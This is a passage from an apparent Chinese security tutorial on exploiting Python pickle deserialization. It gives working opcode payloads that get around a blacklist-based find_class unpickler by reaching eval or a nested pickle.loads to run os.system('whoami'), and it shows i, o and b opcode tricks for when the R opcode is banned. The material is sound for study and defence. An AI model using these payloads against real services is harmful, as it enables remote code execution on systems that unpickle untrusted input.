<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br>opcode3=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br> <br><span class="hljs-comment">#以上opcode相当于执行了builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;)</span><br> <br>pickletools.dis(opcode3)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode3))<br> <br><span class="hljs-comment">###结果如下</span><br>    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins getattr&#x27;</span><br>   <span class="hljs-number">18</span>: (    MARK<br>   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">&#x27;builtins dict&#x27;</span><br>   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">&#x27;get&#x27;</span><br>   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)<br>   <span class="hljs-number">42</span>: R    REDUCE<br>   <span class="hljs-number">43</span>: (    MARK<br>   <span class="hljs-number">44</span>: c        GLOBAL     <span class="hljs-string">&#x27;builtins globals&#x27;</span><br>   <span class="hljs-number">62</span>: (        MARK<br>   <span class="hljs-number">63</span>: t            TUPLE      (MARK at <span class="hljs-number">62</span>)<br>   <span class="hljs-number">64</span>: R        REDUCE<br>   <span class="hljs-number">65</span>: S        STRING     <span class="hljs-string">&#x27;builtins&#x27;</span><br>   <span class="hljs-number">77</span>: t        TUPLE      (MARK at <span class="hljs-number">43</span>)<br>   <span class="hljs-number">78</span>: R    REDUCE<br>   <span class="hljs-number">79</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br>&lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure>
<p>最后我们再调用获取到的builtins的eval函数即可</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br> <br>opcode4=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br> <br><span class="hljs-built_in">print</span>(pickle.loads(opcode4))<br> <br><span class="hljs-comment">###</span><br>&lt;built-<span class="hljs-keyword">in</span> function <span class="hljs-built_in">eval</span>&gt;<br></code></pre></td></tr></table></figure>
<p>最终payload为：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tRp1</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)Rp2</span><br><span class="hljs-string">00g1</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;builtins&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>这里附上GPT的分析，但解释的不太好。。。</p>
<h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3>
<p>这里也是跟着佬学的，他是通过globals全局变量中的pickle直接进行的，说明如下：</p>
<p class='item-img' data-src='image-20231116214117639.png'><img src="image-20231116214117639.png" alt="image-20231116214117639"></p>
<p>输出之后我们看到里面确实含有pickle模块，那我们可以尝试导入使用pickle.loads()来绕过find_class()的限制</p>
<p>但这里存在一些小问题，这里直接放出佬的思考研究了：</p>
<p>不过值得注意的是，由于<code>pickle.loads()</code>的参数需要为<code>byte</code>类型。而在<code>Protocol 0</code>中，对于byte类型并没有很好的支持，需要额外导入encode()函数，可能会导致无法绕过<code>find_class</code>限制。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br>b=<span class="hljs-string">b&#x27;abcdef&#x27;</span><br>opcode=pickle.dumps(b,protocol=<span class="hljs-number">0</span>)<br>pickletools.dis(opcode)<br><br><span class="hljs-comment">###</span><br>   <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;_codecs encode&#x27;</span><br>   <span class="hljs-number">16</span>: p    PUT        <span class="hljs-number">0</span><br>   <span class="hljs-number">19</span>: (    MARK<br>   <span class="hljs-number">20</span>: V        UNICODE    <span class="hljs-string">&#x27;abcdef&#x27;</span><br>   <span class="hljs-number">28</span>: p        PUT        <span class="hljs-number">1</span><br>   <span class="hljs-number">31</span>: V        UNICODE    <span class="hljs-string">&#x27;latin1&#x27;</span><br>   <span class="hljs-number">39</span>: p        PUT        <span class="hljs-number">2</span><br>   <span class="hljs-number">42</span>: t        TUPLE      (MARK at <span class="hljs-number">19</span>)<br>   <span class="hljs-number">43</span>: p    PUT        <span class="hljs-number">3</span><br>   <span class="hljs-number">46</span>: R    REDUCE<br>   <span class="hljs-number">47</span>: p    PUT        <span class="hljs-number">4</span><br>   <span class="hljs-number">50</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
<p>直到<code>Protocol 3</code>版本，Python才引入了<code>B</code>和<code>C</code>两个字节码来标识byte类型</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># Protocol 3 (Python 3.x)</span><br> <br>BINBYTES       = <span class="hljs-string">b&#x27;B&#x27;</span>   <span class="hljs-comment"># push bytes; counted binary string argument</span><br>SHORT_BINBYTES = <span class="hljs-string">b&#x27;C&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br>b=<span class="hljs-string">b&#x27;abcdef&#x27;</span><br>opcode=pickle.dumps(b,protocol=<span class="hljs-number">0</span>)<br>pickletools.dis(opcode)<br><br><span class="hljs-comment">###</span><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span><br>    <span class="hljs-number">2</span>: C    SHORT_BINBYTES <span class="hljs-string">b&#x27;abcdef&#x27;</span><br>   <span class="hljs-number">10</span>: q    BINPUT     <span class="hljs-number">0</span><br>   <span class="hljs-number">12</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>可以看到此时pickle对于<code>byte</code>类型变量的支持精简了很多。所以当我们想利用<code>pickle.loads()</code>来绕过find_class时，最好选择<code>Protocol 3</code>版本的opcode构造。</p>
<p>下面我们就来一步步构造<code>Protocol 3</code>版本的Payload</p>
<p>首先获取get函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">getattr</span>,(builtins.<span class="hljs-built_in">dict</span>, <span class="hljs-string">&#x27;get&#x27;</span>,))<br><br>poc = Demo()<br>opcode = pickle.dumps(poc, protocol=<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(opcode)<br>pickletools.dis(opcode)<br><br><span class="hljs-comment">#输出：</span><br><span class="hljs-string">b&#x27;\x80\x03cbuiltins\ngetattr\nq\x00cbuiltins\ndict\nq\x01X\x03\x00\x00\x00getq\x02\x86q\x03Rq\x04.&#x27;</span><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span><br>    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins getattr&#x27;</span><br>   <span class="hljs-number">20</span>: q    BINPUT     <span class="hljs-number">0</span><br>   <span class="hljs-number">22</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins dict&#x27;</span><br>   <span class="hljs-number">37</span>: q    BINPUT     <span class="hljs-number">1</span><br>   <span class="hljs-number">39</span>: X    BINUNICODE <span class="hljs-string">&#x27;get&#x27;</span><br>   <span class="hljs-number">47</span>: q    BINPUT     <span class="hljs-number">2</span><br>   <span class="hljs-number">49</span>: \x86 TUPLE2<br>   <span class="hljs-number">50</span>: q    BINPUT     <span class="hljs-number">3</span><br>   <span class="hljs-number">52</span>: R    REDUCE<br>   <span class="hljs-number">53</span>: q    BINPUT     <span class="hljs-number">4</span><br>   <span class="hljs-number">55</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p>其中有很多<code>q\0xn</code>字节码，实际测试去掉也是可以的</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">BINPUT         = <span class="hljs-string">b&#x27;q&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br></code></pre></td></tr></table></figure>
<p>构造思路和<code>Protocol 0</code>类似，我们构造出pickle.loads()函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br> <br>opcode=<span class="hljs-string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntR.&quot;</span><br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br> <br><span class="hljs-comment">###</span><br>&lt;built-<span class="hljs-keyword">in</span> function loads&gt;<br></code></pre></td></tr></table></figure>
<p>这上述的构造pickle.loads真心看不懂。。。。接着我们生成要执行的Payload</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        command=<span class="hljs-string">&quot;whoami&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system,(command,))<br> <br>op=Command()<br>opcode=pickle.dumps(op,protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(opcode)<br> <br><span class="hljs-comment">###</span><br><span class="hljs-string">b&#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span><br></code></pre></td></tr></table></figure>
<p>由于loads()函数接受的是byte类型参数，为了方便构造，我们先手动看一下<code>pickle.loads(payload)</code>的字节码，方便我们后续构造</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">bin</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (pickle.loads,(<span class="hljs-string">b&#x27;&#x27;&#x27;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&#x27;&#x27;&#x27;</span>,))<br> <br>b=<span class="hljs-built_in">bin</span>()<br><span class="hljs-comment"># b=b&#x27;abcdef&#x27;</span><br>opcode=pickle.dumps(b,protocol=<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(opcode)<br>pickletools.dis(opcode)<br> <br><span class="hljs-comment">###</span><br><span class="hljs-string">b&quot;\x80\x03c_pickle\nloads\nq\x00C\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.q\x01\x85q\x02Rq\x03.&quot;</span><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span><br>    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">&#x27;_pickle loads&#x27;</span><br>   <span class="hljs-number">17</span>: q    BINPUT     <span class="hljs-number">0</span><br>   <span class="hljs-number">19</span>: C    SHORT_BINBYTES <span class="hljs-string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span><br>   <span class="hljs-number">46</span>: q    BINPUT     <span class="hljs-number">1</span><br>   <span class="hljs-number">48</span>: \x85 TUPLE1<br>   <span class="hljs-number">49</span>: q    BINPUT     <span class="hljs-number">2</span><br>   <span class="hljs-number">51</span>: R    REDUCE<br>   <span class="hljs-number">52</span>: q    BINPUT     <span class="hljs-number">3</span><br>   <span class="hljs-number">54</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>这里使用了字节码<code>C</code>代表byte类型，然后后面跟上数据长度的十六进制即可，我们将加粗部分<code>C\x19cos\nsystem\n(S'whoami'\ntR.</code>和上文构造好的<code>pickle.loads()</code>函数合并即可，完整payload如下。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode=<span class="hljs-string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span><br></code></pre></td></tr></table></figure>
<p>测试绕过</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br> <br>opcode2=opcode=<span class="hljs-string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span><br>restricted_loads(opcode2)<br> <br><span class="hljs-comment">###</span><br>xiaoh\<span class="hljs-number">34946</span><br></code></pre></td></tr></table></figure>
<p>思路二虽然相比思路一稍许麻烦，但是我们通过构造pickle.loads()来<code>*unpickle*</code>任意opcode。虽然find_class会对字节码<code>c</code>导入模块的时候进行检查，但我们构造pickle.loads()时并没有违反find_class的规则。并且当调用我们构造的字节码形式的pickle.loads(payloads)时，并不会触发find_class。所以只要我们能够构造出<code>pickle.loads()</code>，理论上我们是可以执行任意字节码的。</p>
<h2 id="7-2-绕过R指令"><a href="#7-2-绕过R指令" class="headerlink" title="7-2-绕过R指令"></a>7.2 绕过R指令</h2>
<p>以上方法虽然能够绕过对<code>module</code>和一些危险函数的限制，但本质上仍然是对<code>__reduce__</code>函数的延伸。倘若将字节码<code>R</code>也禁用了，那我们怎么进行RCE呢？</p>
<p>如果你还记得我上文所说的pickle漏洞命令执行的几种方法的话，你肯定能立即想到和函数执行有关的字节码<code>R</code>、<code>i</code>、<code>o</code>。实际上，如果没有<code>R</code>指令，我们同样能够进行函数执行。有下面这样一个例子</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> stao<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, category</span>):<br>        self.name = name<br>        self.category = category<br> <br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> Animal <span class="hljs-keyword">and</span> self.name == other.name <span class="hljs-keyword">and</span> self.category == other.category<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no reduce!&#x27;</span><br>    x=pickle.loads(data)<br>    <span class="hljs-keyword">if</span>(x!= Animal(stao.name,stao.age)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;not equal&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(stao.name,stao.age))<br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#stao.py</span><br> <br>name=<span class="hljs-string">&quot;stao&quot;</span><br>age=<span class="hljs-number">18</span><br></code></pre></td></tr></table></figure>
<p>这里禁用了R指令，但是我们仍有方法初始化一个Animal对象。上文提到过，使用R指令实例化对象的过程，实际上就是调用构造函数的过程，本质上也是函数执行，所以我们同样能够使用其他指令绕过。</p>
<h3 id="i指令"><a href="#i指令" class="headerlink" title="i指令"></a>i指令</h3>
<p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;stao&#x27;</span><br><span class="hljs-string">I18</span><br><span class="hljs-string">i__main__</span><br><span class="hljs-string">Animal</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<h3 id="o指令"><a href="#o指令" class="headerlink" title="o指令"></a>o指令</h3>
<p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">Animal</span><br><span class="hljs-string">S&#x27;stao&#x27;</span><br><span class="hljs-string">I18</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>假如这里我们不知道<code>stao</code>模块的内容，我们可以通过变量覆盖的方式将原有stao中的变量覆盖掉。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">stao</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;Hacker&#x27;</span><br><span class="hljs-string">S&#x27;age&#x27;</span><br><span class="hljs-string">I18</span><br><span class="hljs-string">db(c__main__</span><br><span class="hljs-string">Animal</span><br><span class="hljs-string">S&#x27;Hacker&#x27;</span><br><span class="hljs-string">I18</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<h3 id="b指令"><a href="#b指令" class="headerlink" title="b指令"></a>b指令</h3>
<p>其实我们在上文已经使用过了<code>b</code>指令，当时他的作用是用来更新栈上的一个字典进行变量覆盖。实际上官方对它的解释是<code>BUILD</code>，当PVM解析到<code>b</code>指令时执行<code>__setstate__</code>或者<code>__dict__.update()</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">BUILD          = <span class="hljs-string">b&#x27;b&#x27;</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span><br></code></pre></td></tr></table></figure>
<p>那什么是<code>__setstate__</code>呢？<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/pickle.html#handling-stateful-objects">官方文档</a>中，如果想要存储对象的状态，就可以使用<code>__getstat__</code>和<code>__setstat__</code>方法。由于<em>pickle</em>同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄<code>open(file,'r')</code>。</p>
<p>我们来看下面的例子</p>
